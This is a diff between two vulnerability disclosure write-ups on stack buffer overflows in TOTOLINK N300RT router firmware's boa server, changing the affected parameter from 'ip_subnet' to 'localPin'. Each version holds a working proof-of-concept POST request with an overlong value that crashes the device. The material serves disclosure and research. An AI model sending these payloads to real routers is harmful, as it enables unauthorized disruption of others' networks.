@@ -1,11 +1,11 @@
 ## **Description**
 
-A buffer overflow vulnerability was discovered in the TOTOLINK firmware N300RT-Ad-V4.0.0-B20211109.1137. The vulnerability arises from the improper input validation of the `'ip_subnet'` parameter in the 'formPortFw' interface of the file boa.
+A buffer overflow vulnerability was discovered in the TOTOLINK firmware N300RT-Ad-V4.0.0-B20211109.1137. The vulnerability arises from the improper input validation of the `'localPin'` parameter in the 'formWsc' interface of the file boa.
 
 ## ​**Affected Product**
 
 - ​**Brand**: TOTOLINK
-- ​**Product**: N300RT-Ad
+- ​**Product**: N300RT
 - ​**Version**: V4.0.0-B20211109.1137
 
 The firmware can be downloaded from the official website.  
@@ -21,23 +21,23 @@ sudo ./run.sh -d totolink ../FIRMWARE/TOTOLINK-N300RT-Ad-V4.0.0-B20211109.1137.w
 - ​**Password**: `admin`
 
 The result of the simulation is as follows: 
-![sim_res](work_record/TOTOLINK/N300RT_ad/7/img/sim_res.png)
+![sim_res](work_record/TOTOLINK/N300RT_ad/2/img/sim_res.png)
 
 ## ​**Vulnerability Analysis**
 
 ### ​**Key Vulnerable Code**
 
-Using ghidra we known that the vulnerability code in function 'FUN_00415ae0' is below:
-![vulner_code.png](work_record/TOTOLINK/N300RT_ad/7/img/vulner_code.png)
+Using ghidra we known that the vulnerability code in function 'FUN_0044182c' is below:
+![vulner_code.png](work_record/TOTOLINK/N300RT_ad/2/img/vulner_code.png)
 - ​**web_get_var** retrieves POST parameters.
 - **sprintf()** is used without length checks, leading to a ​buffer overflow.​
 
 ## **Proof of Concept (PoC)**
 ### ​**Exploit Request**
-We use burpsuite to capture a normal POST packet for test. To trigger the vulner, we set the parameter 'addPortFw' to not None.
+We use burpsuite to capture a normal POST packet for test.
 Example package
 ```http
-POST /boafrm/formPortFw HTTP/1.1  
+POST /boafrm/formWsc HTTP/1.1  
 Host: 192.168.0.1  
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0  
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
@@ -51,8 +51,8 @@ Referer: http://192.168.0.1/wlwps.htm
 Cookie: session=1335027320  
 Upgrade-Insecure-Requests: 1  
   
-addPortFw=1&fw_ip=1&ip_subnet=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+submit-url=%2Fwlwps.htm&resetUnCfg=0&localPin=1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&targetAPMac=&targetAPSsid=&peerPin=&setPIN=&configVxd=off&resetRptUnCfg=0&peerRptPin=
 ```
 
 After the request the `boa` process will crash.
-![result](work_record/TOTOLINK/N300RT_ad/7/img/result.png)
+![result](work_record/TOTOLINK/N300RT_ad/2/img/result.png)
